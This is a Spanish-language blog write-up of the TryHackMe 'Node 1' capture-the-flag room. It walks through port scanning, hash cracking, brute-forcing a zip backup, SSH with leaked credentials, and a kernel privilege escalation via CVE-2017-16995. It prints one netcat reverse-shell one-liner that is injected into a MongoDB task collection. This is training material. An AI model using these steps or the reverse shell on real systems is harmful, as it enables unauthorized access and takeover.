<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>TryHackMe - Node 1 :: sckull — HackTheBox Writeups, CTF</title>    
  
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">

<meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Titulo Node 1     Room Node 1   Info Node is a medium level boot2root challenge, originally created for HackTheBox.   Puntos 617   Dificultad Media   Maker coderj    NMAP Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.
# Nmap 7.80 scan initiated Wed Feb 26 23:37:37 2020 as: nmap -p- -T4 -sV -o nmap_scan 10."/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="https://sckull.github.io/posts/nodeone/" />


<link rel="stylesheet" href="https://sckull.github.io/assets/style.css">


<link rel="stylesheet" href="https://sckull.github.io/style.css">


<link rel="shortcut icon" href="https://sckull.github.io/img/favicon.png">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="https://kit.fontawesome.com/57784fec54.js" crossorigin="anonymous"></script>


<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="TryHackMe - Node 1 :: sckull — HackTheBox Writeups, CTF" />
<meta name="twitter:description" content="Titulo Node 1     Room Node 1   Info Node is a medium level boot2root challenge, originally created for HackTheBox.   Puntos 617   Dificultad Media   Maker coderj    NMAP Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.
# Nmap 7.80 scan initiated Wed Feb 26 23:37:37 2020 as: nmap -p- -T4 -sV -o nmap_scan 10." />
<meta name="twitter:site" content="https://sckull.github.io/" />
<meta name="twitter:creator" content="sckull" />
<meta name="twitter:image" content="https://sckull.github.io/image/tryhackme/nodeone/cover.png">





<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="TryHackMe - Node 1 :: sckull — HackTheBox Writeups, CTF">
<meta property="og:description" content="Titulo Node 1     Room Node 1   Info Node is a medium level boot2root challenge, originally created for HackTheBox.   Puntos 617   Dificultad Media   Maker coderj    NMAP Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.
# Nmap 7.80 scan initiated Wed Feb 26 23:37:37 2020 as: nmap -p- -T4 -sV -o nmap_scan 10." />
<meta property="og:url" content="https://sckull.github.io/posts/nodeone/" />
<meta property="og:site_name" content="TryHackMe - Node 1" />
<meta property="og:image" content="https://sckull.github.io/image/tryhackme/nodeone/cover.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />


<script type="application/ld+json">
    {
        "@context" : "http://schema.org",
        "@type" : "BlogPosting",
        "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https://sckull.github.io/"
        },
        "articleSection" : "posts",
        "name" : "TryHackMe - Node 1",
        "headline" : "TryHackMe - Node 1",
        "description" : "Titulo Node 1     Room Node 1   Info Node is a medium level boot2root challenge, originally created for HackTheBox.   Puntos 617   Dificultad Media   Maker coderj    NMAP Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.
# Nmap 7.80 scan initiated Wed Feb 26 23:37:37 2020 as: nmap -p- -T4 -sV -o nmap_scan 10.",
        "inLanguage" : "en-US",
        "author" : "",
        "creator" : "",
        "publisher": "",
        "accountablePerson" : "",
        "copyrightHolder" : "",
        "copyrightYear" : "2020",
        "datePublished": "2020-02-26 00:00:00 &#43;0000 UTC",
        "dateModified" : "2020-02-26 00:00:00 &#43;0000 UTC",
        "url" : "https://sckull.github.io/posts/nodeone/",
        "wordCount" : "520",
        "keywords" : [ "tryhackme","linux","CVE-2017-16995","Blog" ]
    }
    </script>


<meta property="article:published_time" content="2020-02-26 00:00:00 &#43;0000 UTC" />




<a name="top"></a>
</head>

<body class="dark-theme">
  
<div class="container">
  <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
    
      
        
                   

          

          

          
            <li><a href="/about">About</a></li>
          

        
      
        
                   

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

        
      
        
                   

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

        
      
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        

          

          

          
            <li><a href="/about">About</a></li>
          

      
    
      
        

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

      
    
      
        

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      
    </span>
  </span>
  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
</header>

  
  <div class="content">    
    

  <div class="post">
    <h2 class="post-title">TryHackMe - Node 1</h2>
    <div class="post-meta">
      
        <span class="post-date">
          <i class="fas fa-calendar-week"></i>
            Wednesday, Feb 26, 2020
        </span>
      
      <span class="post-author">— Written by sckull</span>
      
        <span class="post-read-time">— 3 min read</span>
      
    </div>
        
    
      <span class="post-tags">
        
         <a class="button-tag" href="https://sckull.github.io/tags/tryhackme/"><li class="fa fa-tag"></li> tryhackme</a>&nbsp;
        
         <a class="button-tag" href="https://sckull.github.io/tags/linux/"><li class="fa fa-tag"></li> linux</a>&nbsp;
        
         <a class="button-tag" href="https://sckull.github.io/tags/cve-2017-16995/"><li class="fa fa-tag"></li> CVE-2017-16995</a>&nbsp;
        
      </span>
    

    
      
        <img src="https://sckull.github.io/posts/nodeone/../../image/tryhackme/nodeone/cover.png" class="post-cover center" />
      
      <hr />
     
    

    <div class="contenido">
      <h2>Contenido</h2>
      <nav id="TableOfContents">
<ul>
<li>
<ul>
<li><a href="#nmap">NMAP</a></li>
<li><a href="#http-puerto-3000">HTTP - Puerto 3000</a></li>
<li><a href="#user-mark">USER - mark</a></li>
<li><a href="#user-tom">USER - tom</a></li>
<li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a></li>
</ul></li>
</ul>
</nav>
    </div>

    <div class="post-content">      
      

<table>
<thead>
<tr>
<th>Titulo</th>
<th>Node 1</th>
</tr>
</thead>

<tbody>
<tr>
<td>Room</td>
<td>Node 1</td>
</tr>

<tr>
<td>Info</td>
<td>Node is a medium level boot2root challenge, originally created for HackTheBox.</td>
</tr>

<tr>
<td>Puntos</td>
<td>617</td>
</tr>

<tr>
<td>Dificultad</td>
<td>Media</td>
</tr>

<tr>
<td>Maker</td>
<td><a href="https://tryhackme.com/p/coderj">coderj</a></td>
</tr>
</tbody>
</table>

<h2 id="nmap">NMAP</h2>

<p>Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.</p>

<pre><code class="language-bash"># Nmap 7.80 scan initiated Wed Feb 26 23:37:37 2020 as: nmap -p- -T4 -sV -o nmap_scan 10.10.27.51
Nmap scan report for 10.10.27.51
Host is up (0.22s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
3000/tcp open  http    Node.js Express framework
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 26 23:43:56 2020 -- 1 IP address (1 host up) scanned in 378.90 seconds
</code></pre>

<h2 id="http-puerto-3000">HTTP - Puerto 3000</h2>

<p>En el puerto 3000 encontramos una pagina que nos muestra tres usuarios.</p>

<p><img src="../../image/tryhackme/nodeone/Screenshot_20200227_011030.png" alt="image" /></p>

<p>Al analizar el codigo fuente de la pagina nos encontramos con los controladores de la pagina.</p>

<p><img src="../../image/tryhackme/nodeone/Screenshot_20200227_011127.png" alt="image" /></p>

<p>En el controlador de <code>home.js</code> encontramos una ruta de una api a la que hace una solicitud.</p>

<p><img src="../../image/tryhackme/nodeone/Screenshot_20200227_011251.png" alt="image" /></p>

<p>Hacemos una consulta a la ruta y nos devuelve tres usuarios, contraseñas encriptadas y que los usuarios no son administradores:
<img src="../../image/tryhackme/nodeone/Screenshot_20200227_011348.png" alt="image" /></p>

<p>Utilizamos crackstation.net para crackear las contraseñas, solo obtuvimos la contraseña de los primeros dos usuarios:
<img src="../../image/tryhackme/nodeone/Screenshot_20200227_011456.png" alt="image" /></p>

<p>En el controlador <code>profile.js</code> encontramos que existe otra ruta en la que se hacen consultas de un usuario especifico pero al hacer una consulta sin un usuario nos muestra nuevamente la lista de usuarios con su contraseña, pero en esta respuesta nos aparece un usuario nuevo el cual es administrador:</p>

<p><img src="../../image/tryhackme/nodeone/Screenshot_20200227_011844.png" alt="image" /></p>

<p>Hash crackeada:
<img src="../../image/tryhackme/nodeone/Screenshot_20200227_011948.png" alt="image" /></p>

<p>Utilizamos las credenciales del usuario nuevo y nos redirige a una pagina nueva en la que podemos descargar un archivo:
<img src="../../image/tryhackme/nodeone/Screenshot_20200227_012033.png" alt="image" /></p>

<p>El archivo contiene una cadena codificada en base64, al decodificarla vemos que es un archivo zip, pero este esta protegido por contraseña:
<img src="../../image/tryhackme/nodeone/Screenshot_20200227_012752.png" alt="image" /></p>

<p>Utilizamos fcrackzip para hacer un ataque de fuerza bruta:
<img src="../../image/tryhackme/nodeone/Screenshot_20200227_013046.png" alt="image" /></p>

<h2 id="user-mark">USER - mark</h2>

<p>Al descomprimir el archivo zip encontramos que, es un backup de la ruta donde se encuentran los archivos de la pagina (<code>/var/html/myplace/</code>). Vemos la contraseña de la conexion de mongodb con el usuario mark, utilizamos estas credenciales para iniciar sesion en el servicio SSH.
<img src="../../image/tryhackme/nodeone/Screenshot_20200227_013459.png" alt="image" /></p>

<p>Obtenemos una shell con el usuario mark.
<img src="../../image/tryhackme/nodeone/Screenshot_20200227_013559.png" alt="image" /></p>

<h2 id="user-tom">USER - tom</h2>

<p>En la carpeta <code>/var/scheduler</code> encontramos una aplicacion la cual contiene una base de datos distinta, y la cual se ejecuta cada 30 segundos, ademas de eso vemos entre los procesos en ejecucion que esta aplicacion la esta ejecutando el usuario tom. La aplicacion realiza una iteracion en la tabla tasks y la ejecuta, luego la elimina.
<img src="../../image/tryhackme/nodeone/Screenshot_20200227_015512.png" alt="image" /></p>

<p>Insertamos una shell inversa en la tabla tasks (coleccion):</p>

<pre><code class="language-bash">db.tasks.insert({ &quot;cmd&quot;: &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.1.72 1338 &gt;/tmp/f&quot; });
</code></pre>

<p><img src="../../image/tryhackme/nodeone/Screenshot_20200227_020646.png" alt="image" /></p>

<p>Despues de 30 segundos se ejecuta nuestra shell inversa y obtenemos una shell con el usuario tom y nuestra flag <strong>user.txt</strong>.
<img src="../../image/tryhackme/nodeone/Screenshot_20200227_020718.png" alt="image" /></p>

<h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>

<p>Vemos la version del kernel y buscamos la misma en searchsploit, vemos que existe un exploit que nos puede ayudar a escalar privilegios.
<img src="../../image/tryhackme/nodeone/Screenshot_20200227_021149.png" alt="image" /></p>

<p><a href="https://www.exploit-db.com/exploits/44298"><strong>CVE-2017-16995</strong></a></p>

<p>Lo compilamos, descargamos en la maquina, le damos permisos de ejecucion, lo ejecutamos y obtenemos una shell con usuario root y nuestra flag <strong>root.txt</strong>.
<img src="../../image/tryhackme/nodeone/Screenshot_20200227_021318.png" alt="image" /></p>

    </div>    
    <hr />
    
    <div>
      
        
<div id="disqus_thread"></div>
<script>
(function() {
var d = document, s = d.createElement('script');
s.src = 'https://sckull.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

      
      
    </div>

    
      <div class="pagination">
        <div class="pagination__title">
          <span class="pagination__title-h">Read other posts</span>
          <hr />
        </div>
        <div class="pagination__buttons">
          
            <span class="button previous">
              <a href="https://sckull.github.io/posts/jokerctf/">
                <span class="button__icon">←</span>
                <span class="button__text">TryHackMe - HA Joker CTF</span>
              </a>
            </span>
          
          
            <span class="button next">
              <a href="https://sckull.github.io/posts/ultratech/">
                <span class="button__text">TryHackMe - Ultratech</span>
                <span class="button__icon">→</span>
              </a>
            </span>
          
        </div>
      </div>
      
    
    
    
  </div>
  
    
  </div>
  
  
    <footer class="footer">
  <div class="footer__inner">
    
      <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span style="font-size: 0.85em;">© 2020 sckull</span>
        
      
      </div>
    
  </div>
</footer>

<script src="https://sckull.github.io/assets/main.js"></script>
<script src="https://sckull.github.io/assets/prism.js"></script>

  
  
  
  <a class="float" id="myBtn" href="#top"><i class="fa fa-arrow-up" aria-hidden="true"></i></a>
  
</div>






</body>
</html>
